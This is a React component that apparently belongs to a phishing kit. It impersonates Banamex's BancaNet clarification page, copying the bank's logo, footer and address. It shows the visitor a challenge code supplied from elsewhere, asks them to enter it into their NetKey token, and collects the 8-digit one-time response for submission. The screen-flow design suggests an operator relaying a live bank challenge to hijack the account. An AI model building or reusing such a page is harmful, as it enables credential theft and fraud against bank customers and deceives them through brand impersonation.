import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { ScreenType } from '@shared/schema';

interface NetKeyManualProps {
  manualChallenge: string;
  onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
}

export const NetKeyManual: React.FC<NetKeyManualProps> = ({ manualChallenge, onSubmit }) => {
  const [netkeyInput, setNetkeyInput] = useState('');

  return (
    <div style={{ 
      margin: 0, 
      fontFamily: '"Helvetica Neue", Arial, sans-serif', 
      background: '#ffffff', 
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      padding: '0'
    }}>
      {/* Header */}
      <div style={{ 
        background: '#ffffff', 
        borderBottom: '2px solid #e0e0e0',
        padding: '20px 40px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between'
      }}>
        <img 
          src="/.banamex/images/logobanamex.svg" 
          alt="Banamex" 
          style={{ height: '40px' }}
        />
        <div style={{ textAlign: 'right', fontSize: '12px', color: '#666' }}>
          <div>SecureBanking | www.banamex.com.mx</div>
          <div style={{ fontWeight: 'bold', marginTop: '4px' }}>Aclaraciones BancaNet</div>
        </div>
      </div>

      {/* Fecha */}
      <div style={{ 
        padding: '15px 40px', 
        fontSize: '13px', 
        color: '#333',
        borderBottom: '1px solid #e0e0e0'
      }}>
        {new Date().toLocaleDateString('es-MX', { 
          weekday: 'long', 
          year: 'numeric', 
          month: 'long', 
          day: 'numeric' 
        })}, {new Date().toLocaleTimeString('es-MX')} Centro de México
      </div>

      {/* Main Content */}
      <div style={{ 
        flex: 1, 
        padding: '40px',
        maxWidth: '800px',
        margin: '0 auto',
        width: '100%'
      }}>
        {/* Título con flecha */}
        <div style={{ marginBottom: '30px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <span style={{ fontSize: '20px', fontWeight: 700, color: '#333' }}>
              Clave dinámica
            </span>
            <span style={{ 
              fontSize: '24px', 
              color: '#e30613',
              fontWeight: 'bold'
            }}>≫</span>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px' }}>
          {/* Columna Izquierda - Instrucciones */}
          <div>
            <div style={{ 
              padding: '20px',
              background: '#f8f8f8',
              borderRadius: '4px',
              marginBottom: '20px'
            }}>
              <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.6', color: '#333' }}>
                Encienda su NetKey Banamex, teclee su <strong>PIN</strong>, le desplegará la palabra <strong>"HOST"</strong> y muéstrele la siguiente clave:
              </p>
            </div>

            {/* Challenge Box */}
            <div style={{ 
              background: '#fff',
              border: '2px solid #153e46',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '20px'
            }}>
              <div style={{ 
                fontSize: '13px', 
                fontWeight: 600, 
                color: '#333',
                marginBottom: '10px'
              }}>
                CHALLNG:
              </div>
              <div style={{ 
                fontSize: '32px', 
                fontWeight: 'bold', 
                color: '#000',
                fontFamily: 'monospace',
                letterSpacing: '4px',
                textAlign: 'center'
              }}>
                {manualChallenge}
              </div>
            </div>

            <div style={{ 
              padding: '20px',
              background: '#f8f8f8',
              borderRadius: '4px'
            }}>
              <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.6', color: '#333' }}>
                Al apagarla su palabra en <strong>"PASS1"</strong> lo introduce en la casilla "Clave dinámica" de la derecha y pulse el siguiente campo:
              </p>
            </div>
          </div>

          {/* Columna Derecha - Input */}
          <div>
            <div style={{ 
              padding: '20px',
              background: '#f8f8f8',
              borderRadius: '4px',
              marginBottom: '20px'
            }}>
              <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.6', color: '#333' }}>
                Presione <strong>"ENT"</strong> en NetKey Banamex generará una clave de 8 dígitos, muéstrela la palabra "HOST" e ingrese en el siguiente campo:
              </p>
            </div>

            {/* Input Field */}
            <div style={{ marginBottom: '20px' }}>
              <label style={{ 
                display: 'block',
                fontSize: '14px',
                fontWeight: 600,
                color: '#333',
                marginBottom: '8px'
              }}>
                Clave dinámica:
              </label>
              <Input
                type="text"
                inputMode="numeric"
                value={netkeyInput}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 8) {
                    setNetkeyInput(value);
                  }
                }}
                maxLength={8}
                style={{
                  width: '100%',
                  padding: '12px',
                  fontSize: '18px',
                  fontFamily: 'monospace',
                  letterSpacing: '4px',
                  textAlign: 'center',
                  border: '1px solid #ccc',
                  borderRadius: '4px'
                }}
                placeholder="00000000"
                data-testid="input-netkey-manual"
              />
            </div>

            {/* Botones */}
            <div style={{ display: 'flex', gap: '10px', justifyContent: 'flex-end' }}>
              <Button
                variant="outline"
                style={{
                  padding: '10px 24px',
                  fontSize: '14px',
                  borderRadius: '4px',
                  border: '1px solid #ccc',
                  background: '#fff',
                  color: '#333'
                }}
                data-testid="button-cancelar-netkey"
              >
                Cancelar
              </Button>
              <Button
                onClick={() => {
                  if (netkeyInput.length === 8) {
                    onSubmit(ScreenType.NETKEY_MANUAL, { 
                      manualNetkeyResponse: netkeyInput
                    });
                  }
                }}
                disabled={netkeyInput.length !== 8}
                style={{
                  padding: '10px 24px',
                  fontSize: '14px',
                  borderRadius: '4px',
                  background: netkeyInput.length === 8 ? '#153e46' : '#ccc',
                  color: '#fff',
                  border: 'none',
                  cursor: netkeyInput.length === 8 ? 'pointer' : 'not-allowed'
                }}
                data-testid="button-continuar-netkey"
              >
                Continuar
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ 
        background: '#f5f5f5',
        padding: '20px 40px',
        borderTop: '1px solid #e0e0e0',
        fontSize: '11px',
        color: '#666',
        textAlign: 'center'
      }}>
        D.R. © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.
        Isabel La Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
        <br />
        <a href="#" style={{ color: '#153e46', textDecoration: 'none', margin: '0 10px' }}>Términos, Condiciones de uso y Privacidad</a>
      </div>
    </div>
  );
};
